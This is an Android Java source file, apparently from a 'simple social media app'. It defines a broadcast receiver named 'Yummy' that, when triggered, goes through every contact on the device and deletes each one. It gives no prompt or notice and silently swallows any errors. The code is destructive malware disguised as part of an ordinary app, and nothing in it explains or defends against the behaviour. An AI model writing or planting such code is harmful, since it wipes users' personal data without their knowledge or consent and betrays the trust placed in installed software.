package com.example.simplesocialmediaapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

public class Yummy extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

        try {
            // Get the content resolver to access contacts
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null
            );

            if (cursor == null) {
                return;
            }

            while (cursor.moveToNext()) {
                int colIndex = cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY);
                if (colIndex >= 0) {
                    String lookupKey = cursor.getString(colIndex);
                    Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
                    contentResolver.delete(uri, null, null);
                }
            }
            cursor.close();
        } catch (Exception e) {
            // Handle any exceptions gracefully
        }
    }
}